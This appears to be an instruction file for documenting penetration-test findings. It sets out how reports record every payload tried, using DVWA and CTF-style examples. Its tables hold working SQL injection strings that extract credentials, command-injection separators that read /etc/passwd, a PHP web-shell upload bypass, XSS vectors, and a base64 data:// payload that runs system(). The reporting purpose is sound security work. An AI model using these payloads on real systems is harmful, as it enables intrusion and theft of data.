---
name: payload_tracking
description: How to document every payload tried during testing — failed and successful — so reports show the full attack narrative
---

# Payload Tracking — Full Documentation Standard

Every vulnerability report MUST document the complete payload trial history: what was tried, what failed, what succeeded, and why.

## Required Documentation per Finding

### 1. Payload Trial Log (in `technical_analysis`)

Document ALL payloads attempted in order:

```markdown
**Payload Trial Log**

| # | Payload | Response | Result |
|---|---------|----------|--------|
| 1 | `' OR 1=1--` | HTTP 200, generic error | ❌ Filtered |
| 2 | `" OR "1"="1` | HTTP 200, same error | ❌ Filtered |
| 3 | `1' AND SLEEP(5)--` | HTTP 200, 5s delay | ✅ Time-based SQLi confirmed |
| 4 | `1' UNION SELECT NULL,NULL--` | HTTP 500 column error | ✅ Union-based possible |
| 5 | `1' UNION SELECT table_name,NULL FROM information_schema.tables--` | HTTP 200, table list | ✅ Data extracted |
```

### 2. Successful Payload Detail (in `poc_script_code`)

Show the exact working payload with full HTTP request/response:

```markdown
**Working Payload:**
```
' UNION SELECT username,password FROM users--
```

**Full HTTP Request:**
```http
GET /vulnerabilities/sqli/?id=1'+UNION+SELECT+username,password+FROM+users--&Submit=Submit HTTP/1.1
Host: target.com
Cookie: PHPSESSID=abc123; security=low
```

**Response (truncated):**
```http
HTTP/1.1 200 OK

<div class='vulnerable_code_area'>
  admin:5f4dcc3b5aa765d61d8327deb882cf99
  gordonb:e99a18c428cb38d5f260853678922e03
</div>
```

**Command/Data confirmed:**
- Extracted credentials: admin / password (MD5)
- Database user: `dvwauser@localhost`
```

### 3. Failed Payloads (why they failed — in `technical_analysis`)

```markdown
**Failed Attempts & Why:**
- `' OR 1=1--` — WAF/input filter strips single quotes in basic mode
- `SLEEP(5)` without quote — parameter is numeric, no injection point there
- `../../../etc/passwd` — path traversal filtered by `str_replace('../', '')`
- `<script>alert(1)</script>` — output HTML-encoded in this context
```

## Format per Vulnerability Class

### Command Injection

```markdown
**Payloads Tried:**
| Payload | Separator | Result |
|---------|-----------|--------|
| `8.8.8.8` | none | ✅ Normal ping output |
| `8.8.8.8; id` | semicolon | ✅ `uid=33(www-data)` |
| `8.8.8.8 && whoami` | && | ✅ `www-data` |
| `8.8.8.8 \| cat /etc/passwd` | pipe | ✅ passwd file returned |
| `8.8.8.8; cat /flag.txt` | semicolon | ✅ Flag: CTF{...} |
| `8.8.8.8$(id)` | $() | ❌ Not executed |

**Confirmed working:** `; id`, `&& cmd`, `| cmd`
**Filtered:** backtick substitution, newline
```

### File Upload Bypass

```markdown
**Upload Bypass Attempts:**
| Filename | Content-Type | Magic Bytes | Result |
|----------|-------------|-------------|--------|
| shell.php | application/x-php | <?php | ❌ Blocked by extension |
| shell.php.jpg | image/jpeg | <?php | ❌ Blocked |
| shell.php | image/jpeg | <?php | ✅ Accepted |
| shell.phtml | image/jpeg | <?php | ✅ Accepted |
| shell.php5 | image/jpeg | <?php | ✅ Accepted |

**Execution test:** GET /uploads/shell.php?cmd=id → `uid=33(www-data)`
```

### XSS

```markdown
**XSS Payloads Tried:**
| Payload | Context | Result |
|---------|---------|--------|
| `<script>alert(1)</script>` | HTML body | ❌ Encoded to `&lt;script&gt;` |
| `<img src=x onerror=alert(1)>` | HTML body | ✅ Alert fired |
| `<svg onload=alert(1)>` | HTML body | ✅ Alert fired |
| `javascript:alert(1)` | href attribute | ❌ Blocked |
| `" onmouseover="alert(1)` | attribute context | ✅ Fired on hover |

**Working context:** HTML body without attribute quoting
**Bypassed:** basic `<script>` filter
```

### LFI / Path Traversal

```markdown
**LFI Payloads Tried:**
| Payload | Result |
|---------|--------|
| `../../etc/passwd` | ❌ Sanitized |
| `....//....//etc/passwd` | ❌ Sanitized |
| `/etc/passwd` | ✅ File returned (absolute path accepted) |
| `php://filter/convert.base64-encode/resource=index.php` | ✅ Source disclosed |
| `expect://id` | ❌ Wrapper not enabled |
| `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=` | ✅ RCE via data:// |

**Note:** `../` sanitized but absolute paths and PHP wrappers allowed.
```

### SQL Injection

```markdown
**SQLi Detection Payloads:**
| Payload | Response | Indicator |
|---------|----------|-----------|
| `1'` | SQL syntax error | ✅ Injection point confirmed |
| `1''` | Normal response | Double-quote escaped → string injection |
| `1 AND 1=1` | Normal | ✅ Numeric injection possible |
| `1 AND 1=2` | Empty result | ✅ Boolean-based confirmed |
| `1 AND SLEEP(5)` | 5s delay | ✅ Time-based confirmed |

**Extraction chain:**
1. `1 ORDER BY 3--` → error (only 2 columns)
2. `1 ORDER BY 2--` → OK (2 columns confirmed)
3. `1 UNION SELECT 1,2--` → columns 1,2 reflected
4. `1 UNION SELECT user(),database()--` → `dvwauser@localhost`, `dvwa`
5. `1 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='dvwa'--` → `guestbook`, `users`
6. `1 UNION SELECT user,password FROM users--` → credentials extracted
```

## Checklist Before Filing Report

- [ ] All payloads tried listed (not just the winning one)
- [ ] Each payload shows exact string, not paraphrase
- [ ] Failed payloads explain WHY they failed (filtered? encoded? no reflection?)
- [ ] Successful payload shows complete HTTP request + response
- [ ] Execution evidence attached (screenshot path, response snippet, command output)
- [ ] Bypasses documented (what filter was bypassed and how)
- [ ] Chaining potential noted (e.g. "LFI → read DB credentials → login → RCE")
